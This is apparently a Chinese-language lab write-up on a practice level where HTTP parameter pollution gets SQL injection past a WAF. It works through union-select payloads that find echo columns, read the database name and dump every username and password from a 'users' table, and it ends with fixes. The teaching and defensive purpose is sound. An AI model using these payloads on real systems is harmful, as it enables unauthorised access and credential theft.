## 一、靶场信息
- **漏洞类型**：HTTP 参数污染（HPP）导致的阻抗不匹配（Impedence Mismatch）。
- **防御机制**：前端存在 WAF（防火墙）拦截恶意关键字，但后端 Web 服务器（PHP）对同名参数的解析与 WAF 不一致。
- **通关思路**：利用 `id=1&id=-1'...` 的形式，第一个 `id` 喂给 WAF 做安全校验，第二个 `id` 喂给后端执行注入。

## 二、核心绕过思路（大白话解析）

**为什么这关叫“阻抗不匹配”？**
以前咱们是在跟 WAF 斗智斗勇，要把 `select` 伪装成别的形状骗过搜身。但这关，WAF 和 PHP 服务器对“谁说了算”产生了分歧：
1. **WAF 看第一个**：WAF 扫描时，看到第一个参数是 `id=1`，觉得非常安全，直接放行。
2. **PHP 取最后一个**：但 PHP 在接收 `$_GET['id']` 时，默认会覆盖前面的值，取**最后一个** `id=-1' union select...`。
3. **结果**：WAF 被“双胞胎”骗了，咱们的恶意代码成功进入了金库。

## 三、详细操作步骤与 Payload 解析

### 第一步：探测回显点

**Payload：**
```text
?id=1&id=-1' union select 1,2,3 --+
```

**回显现象：**
页面显示 `Your Login name:2` 和 `Your Password:3`。

**大白话解析：**
*   **`id=1&`**：这是咱们用来“糊弄” WAF 的伪装。WAF 看到第一个参数是干净的 `1`，直接放行。
*   **`id=-1'`**：这是咱们真正的武器。PHP 解析时，后面出现的 `id` 会覆盖前面的，所以服务器实际执行的是 `-1`。加上单引号是为了闭合后台的 SQL 语句。
*   **`union select 1,2,3`**：咱们最熟悉的联合查询，强行让数据库多返回一列结果。
*   **`--+`**：注释符，把原 SQL 语句后面的 `LIMIT 0,1` 给干掉，保证咱们的联合查询语法不报错。

### 第二步：爆当前数据库名

**Payload：**
```text
?id=1&id=-1' union select 1,database(),3 --+
```

**回显现象：**
页面 `Your Login name:` 后面显示 `security`。

**大白话解析：**
*   前面第一步的逻辑完全不变，依然用 `id=1` 骗 WAF，用 `id=-1'` 闭合。
*   把第一步里测试用的数字 `2`，替换成 `database()` 这个内置函数。意思是：“别拿那个假数据糊弄我，把当前数据库的真名给我打印在第二列上”。

### 第三步：终极脱库（提取账号密码）

**Payload：**
```text
?id=1&id=-1' union select 1,group_concat(username,0x3a,password),3 from users --+
```

**回显现象：**
页面成功爆出所有账号密码，例如 `Dumb:Dumb,Angelina:I-kill-you...`。

**大白话解析：**
*   **`group_concat(username,0x3a,password)`**：这是一个超级打包机。它把 `users` 表里的用户名和密码全部拿出来，中间用 `0x3a`（冒号的十六进制）连成一长串，一次性塞到第 2 列显示。
*   **`from users`**：明确告诉数据库，咱们要去 `users` 这个表里找数据。
*   依然别忘了前面用 `id=1&` 骗过 WAF。

## 四、核心防御机制（Remediation）
- **统一参数解析**：确保 WAF 和 Web 服务器对同名参数的解析规则保持绝对一致（比如都取第一个或都拒绝）。
- **预编译语句（PDO/MySQLi）**：无论 WAF 怎么被绕过，后端的参数化查询能彻底阻断注入执行。
